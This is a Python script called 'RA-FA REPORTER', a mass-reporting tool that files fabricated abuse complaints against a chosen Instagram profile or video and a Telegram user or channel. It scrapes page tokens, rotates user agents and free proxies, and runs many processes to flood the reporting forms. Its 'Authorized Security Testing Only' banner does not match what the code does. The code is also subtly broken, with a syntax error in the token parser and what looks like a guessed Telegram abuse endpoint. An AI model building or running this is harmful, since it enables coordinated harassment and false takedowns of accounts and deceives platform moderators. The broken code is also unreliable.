#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RA‑FA REPORTER v2.0 – Instagram + Telegram Mass Reporting Tool

Author   : White Hack Labs
License  : MIT
"""

# --------------------------------------------------------------------------- #
# 1. Imports & basic sanity checks
# --------------------------------------------------------------------------- #
import sys
import re
import random
import string
import time
from multiprocessing import Process
from threading import Thread
from queue import Queue

# optional: if you want to colour the terminal
try:
    from colorama import Fore, Back, Style, init as colour_init
    colour_init()
except Exception:
    # create dummy colour functions if colorama is missing
    class Dummy:
        def __getattr__(self, name):
            return ""

    Fore = Back = Style = Dummy()

# requests is the only external dependency that must be present
try:
    import requests
    from requests import Session, get as rget
except ImportError:
    print("[-] 'requests' package not installed!")
    print("[*] Run: pip install requests")
    sys.exit(1)

# --------------------------------------------------------------------------- #
# 2. Helpers – printing helpers
# --------------------------------------------------------------------------- #
def _print(col, prefix, *args):
    """Internal coloured printer"""
    msg = f"{col}{prefix} {Style.RESET_ALL}{Style.BRIGHT} " + " ".join(str(a) for a in args)
    print(msg)

def print_success(*args):  _print(Fore.GREEN, "[ OK ]", *args)
def print_error(*args):    _print(Fore.RED,   "[ ERR ]", *args)
def print_status(*args):   _print(Fore.BLUE,  "[ * ]", *args)
def print_question(*args): _print(Fore.YELLOW, "[ ? ]", *args)

# --------------------------------------------------------------------------- #
# 3. User‑agent pool & utility helpers
# --------------------------------------------------------------------------- #
USER_AGENTS = [
    # a short list – you can add more if you wish
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)\
 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko)\
 Chrome/125.0.0.0 Mobile Safari/537.36",
]
def get_user_agent() -> str:
    return random.choice(USER_AGENTS)

def chunks(lst, n):
    """Yield successive n‑sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

# --------------------------------------------------------------------------- #
# 4. Proxy handling
# --------------------------------------------------------------------------- #
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    # … add more sources as needed
]

def _test_http_proxy(proxy: str, result_queue: Queue) -> None:
    """Quick single‑proxy test – runs in a thread."""
    ua = get_user_agent()
    try:
        s = Session()
        s.proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
        s.headers.update({"User-Agent": ua, "Connection": "close"})
        # simple connectivity test
        resp = s.get("https://connectivitycheck.platform.hadielkadi.com/generate_204",
                     timeout=3, allow_redirects=False)
        if resp.status_code in (200, 204, 302, 301):
            result_queue.put(proxy)
            print_success("Proxy OK:", proxy)
        else:
            result_queue.put(None)
    except Exception:
        result_queue.put(None)

def find_proxies(max_proxies: int = 120, batch: int = 30) -> list:
    """Fetch & validate proxies from the internet."""
    proxy_set = set()
    ua = get_user_agent()
    print_status("Fetching proxies…")
    for url in PROXY_SOURCES:
        try:
            r = rget(url, headers={"User-Agent": ua}, timeout=8)
            if r.status_code != 200:
                continue
            for line in r.text.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                if "://" in line:
                    line = line.split("://")[-1]
                if re.match(r'^\d{1,3}(?:\.\d{1,3}){3}:\d+$', line):
                    proxy_set.add(line)
        except Exception:
            pass

    proxy_list = list(proxy_set)
    print_status(f"Found {len(proxy_list)} raw proxies.")
    if not proxy_list:
        print_error("No proxies found.")
        return []

    # Test them in batches
    print_status(f"Testing up to {max_proxies} proxies…")
    valid = []
    to_test = proxy_list[:max_proxies]
    for start in range(0, len(to_test), batch):
        q = Queue()
        threads = []
        for proxy in to_test[start:start + batch]:
            t = Thread(target=_test_http_proxy, args=(proxy, q))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=5)
        while not q.empty():
            p = q.get()
            if p:
                valid.append(p)
        if len(valid) >= batch:
            break

    if not valid:
        print_status("No working proxies – falling back to raw list.")
        valid = proxy_list[:50]

    # keep a tidy number (multiple of 5, max 50)
    if len(valid) % 5:
        valid = valid[:len(valid) - (len(valid) % 5)]
    valid = valid[:50]
    print_status(f"Using {len(valid)} working proxies.")
    return valid

def parse_proxy_file(path: str) -> list:
    """Load proxies from a local text file."""
    try:
        with open(path, "r", encoding="utf-8") as fh:
            proxies = [ln.strip() for ln in fh if ln.strip() and re.match(r'^\d{1,3}(?:\.\d{1,3}){3}:\d+$', ln)]
        if len(proxies) > 50:
            proxies = random.sample(proxies, 50)
        print_success(f"{len(proxies)} proxies loaded from {path}")
        return proxies
    except FileNotFoundError:
        print_error(f"Proxy file not found: {path}")
        return []

# --------------------------------------------------------------------------- #
# 5. Token extraction helpers – Instagram
# --------------------------------------------------------------------------- #
def _extract_tokens(html: str) -> dict | None:
    """Parse the required Instagram tokens from the help page."""
    markers = [
        ("lsd",   '["LSD",[],{"token":"', '"},'),
        ("spin_r",'"__spin_r":', ','),
        ("spin_t",'"__spin_t":', ','),
        ("hsi",   '"hsi":', ','),
        ("rev",   '"server_revision":', ','),
    ]

    tokens = {}
    for key, start, end in markers:
        if start not in html:
            return None
        try:
            val = html.split(start)[1].split(end)[0].replace('"', '').strip()
            tokens[key] = val
        except Exception:
            return None

    # spin_b is optional – we ignore it if missing
    if "__spin_b": in html:
        try:
            tokens["spin_b"] = html.split('"__spin_b":')[1].split(',')[0].replace('"', '').strip()
        except Exception:
            return None

    return tokens

def _get_jazoest(html: str) -> str | None:
    """Extract the jazoest value from the help page."""
    match = re.search(r'name="jazoest" value="(\d+)"', html)
    if match:
        return match.group(1)
    return None

# --------------------------------------------------------------------------- #
# 6. Session setup
# --------------------------------------------------------------------------- #
def _setup_session(proxy: str | None = None) -> tuple[Session, str]:
    ses = Session()
    if proxy:
        ses.proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
    ua = get_user_agent()
    ses.headers.update({"User-Agent": ua})
    return ses, ua

# --------------------------------------------------------------------------- #
# 7. Instagram reporting – profile
# --------------------------------------------------------------------------- #
def report_profile_attack(username: str, proxy: str | None = None) -> None:
    ses, ua = _setup_session(proxy)
    page_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    report_headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "help.instagram.com",
        "Origin": "https://help.instagram.com",
        "Referer": "https://help.instagram.com/contact/497253480400030",
    }

    try:
        # step 1 – get the initial page to fetch js_datr and jazoest
        r = ses.get("https://www.facebook.com/", headers=page_headers, timeout=10)
        if r.status_code != 200 or '["_js_datr",' not in r.text:
            raise RuntimeError("Failed to load Facebook home page")

        js_datr = r.text.split('["_js_datr","')[1].split('",')[0]
        jazoest = _get_jazoest(r.text) or "2723"  # fallback
        tokens = _extract_tokens(r.text)
        if not tokens:
            raise RuntimeError("Token extraction failed")

        # step 2 – open the help page to get the datr cookie
        r = ses.get("https://help.instagram.com/contact/497253480400030",
                    cookies={"_js_datr": js_datr},
                    headers=page_headers,
                    timeout=10)
        if r.status_code != 200 or "datr" not in r.cookies:
            raise RuntimeError("Failed to load help page")

        datr = r.cookies.get("datr")
        # The form data – most of it is static, only the tokens change
        form = {
            "jazoest": jazoest,
            "lsd": tokens["lsd"],
            "Field419623844841592": username,
            "Field1476905342523314_iso2_country_code": "US",
            "Field1476905342523314": "United States",
            "support_form_id": "440963189380968",
            "support_form_hidden_fields": '{"423417021136459":false,"419623844841592":false,"754839691215928":false,"1476905342523314":false,"284770995012493":true,"237926093076239":false}',
            "support_form_fact_false_fields": "[]",
            "__user": "0",
            "__a": "1",
            "__dyn": "7xe6Fo4SQ1PyUhxOnFwn84a2i5U4e1Fx-ey8kxx0LxW0DUeUhw5cx60Vo1upE4W0OE2WxO0SobEa81Vrzo5-0jx0Fwww6DwtU6e",
            "__csr": "",
            "__req": "d",
            "__beoa": "0",
            "__pc": "PHASED:DEFAULT",
            "dpr": "1",
            "__rev": tokens["rev"],
            "__s": "5gbxno:2obi73:56i3vc",
            "__hsi": tokens["hsi"],
            "__comet_req": "0",
            "__spin_r": tokens["spin_r"],
            "__spin_b": tokens.get("spin_b", ""),
            "__spin_t": tokens["spin_t"],
        }

        # step 3 – submit the report
        r = ses.post("https://help.instagram.com/ajax/help/contact/submit/page",
                     data=form,
                     headers=report_headers,
                     cookies={"datr": datr},
                     timeout=10)
        if r.status_code == 200:
            print_success("[IG] Reported @", username, "via", proxy or "direct")
        else:
            print_error("[IG] Report failed (", r.status_code, ")")
    except Exception as exc:
        print_error("[IG] Error reporting @", username, ":", exc)

# --------------------------------------------------------------------------- #
# 8. Instagram reporting – video
# --------------------------------------------------------------------------- #
def report_video_attack(video_url: str, proxy: str | None = None) -> None:
    """Same as profile attack but the form field is a video URL."""
    ses, ua = _setup_session(proxy)
    page_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    report_headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "help.instagram.com",
        "Origin": "https://help.instagram.com",
        "Referer": "https://help.instagram.com/contact/497253480400030",
    }

    try:
        r = ses.get("https://www.facebook.com/", headers=page_headers, timeout=10)
        if r.status_code != 200 or '["_js_datr",' not in r.text:
            raise RuntimeError("Failed to load Facebook home page")
        js_datr = r.text.split('["_js_datr","')[1].split('",')[0]
        jazoest = _get_jazoest(r.text) or "2723"
        tokens = _extract_tokens(r.text)
        if not tokens:
            raise RuntimeError("Token extraction failed")

        r = ses.get("https://help.instagram.com/contact/497253480400030",
                    cookies={"_js_datr": js_datr},
                    headers=page_headers,
                    timeout=10)
        if r.status_code != 200 or "datr" not in r.cookies:
            raise RuntimeError("Failed to load help page")
        datr = r.cookies.get("datr")

        form = {
            "jazoest": jazoest,
            "lsd": tokens["lsd"],
            "Field419623844841592": video_url,
            "Field1476905342523314_iso2_country_code": "US",
            "Field1476905342523314": "United States",
            "support_form_id": "440963189380968",
            "support_form_hidden_fields": '{"423417021136459":false,"419623844841592":false,"754839691215928":false,"1476905342523314":false,"284770995012493":true,"237926093076239":false}',
            "support_form_fact_false_fields": "[]",
            "__user": "0",
            "__a": "1",
            "__dyn": "7xe6Fo4SQ1PyUhxOnFwn84a2i5U4e1Fx-ey8kxx0LxW0DUeUhw5cx60Vo1upE4W0OE2WxO0SobEa81Vrzo5-0jx0Fwww6DwtU6e",
            "__csr": "",
            "__req": "d",
            "__beoa": "0",
            "__pc": "PHASED:DEFAULT",
            "dpr": "1",
            "__rev": tokens["rev"],
            "__s": "5gbxno:2obi73:56i3vc",
            "__hsi": tokens["hsi"],
            "__comet_req": "0",
            "__spin_r": tokens["spin_r"],
            "__spin_b": tokens.get("spin_b", ""),
            "__spin_t": tokens["spin_t"],
        }

        r = ses.post("https://help.instagram.com/ajax/help/contact/submit/page",
                     data=form,
                     headers=report_headers,
                     cookies={"datr": datr},
                     timeout=10)
        if r.status_code == 200:
            print_success("[IG] Video reported via", proxy or "direct")
        else:
            print_error("[IG] Video report failed (", r.status_code, ")")
    except Exception as exc:
        print_error("[IG] Video submission error:", exc)

# --------------------------------------------------------------------------- #
# 9. Telegram reporting – user & channel
# --------------------------------------------------------------------------- #
def _telegram_report(user_type: str, username: str, proxy: str | None = None) -> None:
    ses, ua = _setup_session(proxy)
    tg_headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        ses.get("https://telegram.org/", headers=tg_headers, timeout=10)

        payload = {
            "type": user_type,
            "username": username,
            "reason": "Spam and abusive behavior" if user_type == "user" else "Spam and illegal content",
            "text": f"{user_type.title()} @{username} is violating Telegram ToS by sending unsolicited spam messages."
                    if user_type == "user"
                    else f"Channel @{username} is distributing spam and violating ToS.",
        }

        r = ses.post("https://telegram.org/abuse",
                     data=payload,
                     headers={
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": "https://telegram.org",
                         "Referer": "https://telegram.org/abuse",
                     },
                     timeout=10)
        if r.status_code in (200, 302, 303):
            print_success("[TG] Report sent for @", username, "via", proxy or "direct")
        else:
            print_error("[TG] Report returned", r.status_code)

        # Just visit the public page – some anti‑spam checks may need it
        ses.get(f"https://t.me/{username}", headers=tg_headers, timeout=10)
    except Exception as exc:
        print_error("[TG] Report failed for @", username, ":", exc)

def report_telegram_user(username: str, proxy: str | None = None) -> None:
    _telegram_report("user", username, proxy)

def report_telegram_channel(channel: str, proxy: str | None = None) -> None:
    _telegram_report("channel", channel, proxy)

# --------------------------------------------------------------------------- #
# 10. Process helpers (to keep the main thread responsive)
# --------------------------------------------------------------------------- #
def _process_worker(func, *args):
    for item in args[0]:
        func(item, args[1])  # proxy list is passed as second argument
        time.sleep(0.2)

def profile_attack_process(username: str, proxies: list):
    if not proxies:
        for _ in range(10):
            report_profile_attack(username, None)
            time.sleep(0.3)
        return
    _process_worker(report_profile_attack, proxies, username)

def video_attack_process(video_url: str, proxies: list):
    if not proxies:
        for _ in range(10):
            report_video_attack(video_url, None)
            time.sleep(0.3)
        return
    _process_worker(report_video_attack, proxies, video_url)

def telegram_user_process(username: str, proxies: list):
    if not proxies:
        for _ in range(10):
            report_telegram_user(username, None)
            time.sleep(0.3)
        return
    _process_worker(report_telegram_user, proxies, username)

def telegram_channel_process(channel: str, proxies: list):
    if not proxies:
        for _ in range(10):
            report_telegram_channel(channel, None)
            time.sleep(0.3)
        return
    _process_worker(report_telegram_channel, proxies, channel)

# --------------------------------------------------------------------------- #
# 11. High‑level attack orchestration
# --------------------------------------------------------------------------- #
def _start_processes(func, target, proxies: list):
    chunk_list = list(chunks(proxies, 10))
    print_status("Starting", target, "attack…")
    for i, plist in enumerate(chunk_list, 1):
        p = Process(target=func, args=(target, plist))
        p.start()
        print_status(f"{i}. Transaction opened!")

def profile_attack(proxies: list):
    username = input("Enter the Instagram username to report: ").strip()
    if not proxies:
        for _ in range(5):
            p = Process(target=profile_attack_process, args=(username, []))
            p.start()
            print_status(f"{_ + 1}. Transaction Opened!")
        return
    _start_processes(profile_attack_process, username, proxies)

def video_attack(proxies: list):
    video_url = input("Enter the Instagram video URL to report: ").strip()
    if not proxies:
        for _ in range(5):
            p = Process(target=video_attack_process, args=(video_url, []))
            p.start()
            print_status(f"{_ + 1}. Transaction Opened!")
        return
    _start_processes(video_attack_process, video_url, proxies)

def telegram_attack(proxies: list):
    print_status("1 - Report a user account")
    print_status("2 - Report a channel/group")
    choice = input("Select type (1/2): ").strip()
    if choice == "1":
        username = input("Enter Telegram username (without @): ").strip()
        if not proxies:
            for _ in range(5):
                p = Process(target=telegram_user_process, args=(username, []))
                p.start()
                print_status(f"{_ + 1}. Report thread opened!")
            return
        _start_processes(telegram_user_process, username, proxies)
    elif choice == "2":
        channel = input("Enter channel username (without @): ").strip()
        if not proxies:
            for _ in range(5):
                p = Process(target=telegram_channel_process, args=(channel, []))
                p.start()
                print_status(f"{_ + 1}. Report thread opened!")
            return
        _start_processes(telegram_channel_process, channel, proxies)
    else:
        print_error("Invalid choice!")
        sys.exit(1)

# --------------------------------------------------------------------------- #
# 12. Proxy selection helper
# --------------------------------------------------------------------------- #
def get_proxies() -> list:
    ret = input("Use proxies? [Y/N] ").strip().lower()
    if ret == "y":
        src = input("Collect proxies from internet? [Y/N] ").strip().lower()
        if src == "y":
            return find_proxies()
        elif src == "n":
            path = input("Enter path to proxy file: ").strip()
            return parse_proxy_file(path)
        else:
            print_error("Invalid choice!")
            sys.exit(1)
    elif ret == "n":
        print_status("No proxies will be used.")
        return []
    else:
        print_error("Invalid choice!")
        sys.exit(1)

# --------------------------------------------------------------------------- #
# 13. Main entry point
# --------------------------------------------------------------------------- #
def print_logo():
    """Just a quick banner – you can replace it with your own art."""
    print(Fore.RED + Style.BRIGHT)
    print("  ██████  █████  ███████ █████  ██████  ███████  █████  ██████  ██████  ██████  ███████ ██████  ███████ ")
    print(" ██  ████   ███   ██   ██   ██  ██       ██    ██   ██  ██  ██      ██  ██      ██  ██       ██      ")
    print(" ██  ████   ███   ██   ██   ████ █████    ██    ██   ████ █████     ██████ ██      ██  █████  ███████ ")
    print(" ██    ██   ███   ██   ██   ██  ██       ██    ██   ██  ██  ██      ██  ██ ██      ██       ██      ")
    print("  ██████    ███    ██    █████  ██████    ██    █████ ██████ ██████  ██  ██  ██████ ██████  ███████ ")
    print("")
    print(Fore.CYAN + Style.BRIGHT + "  ╔══════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "  ║           RA-FA REPORTER v2.0                      ║")
    print(Fore.CYAN + Style.BRIGHT + "  ║   Instagram + Telegram Mass Reporting Tool        ║")
    print(Fore.CYAN + Style.BRIGHT + "  ║     Authorized Security Testing Only              ║")
    print(Fore.CYAN + Style.BRIGHT + "  ╚══════════════════════════════════════════════════╝")
    print(Style.RESET_ALL)

def main():
    print_logo()
    proxies = get_proxies()

    print_status("Select Platform:")
    print_status("1 - Instagram (report profile)")
    print_status("2 - Instagram (report video)")
    print_status("3 - Telegram (report user/channel)")
    choice = input("Select (1/2/3): ").strip()

    if choice not in {"1", "2", "3"}:
        print_error("Invalid selection!")
        sys.exit(1)

    if choice == "1":
        profile_attack(proxies)
    elif choice == "2":
        video_attack(proxies)
    else:
        telegram_attack(proxies)

    print_status("RA‑FA REPORTER finished. Press Enter to exit.")
    input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + Fore.RED + "[ * ] RA-FA REPORTER shutting down.")
        sys.exit(0)
    except Exception as exc:
        print_error("Unhandled error:", exc)
        sys.exit(1)
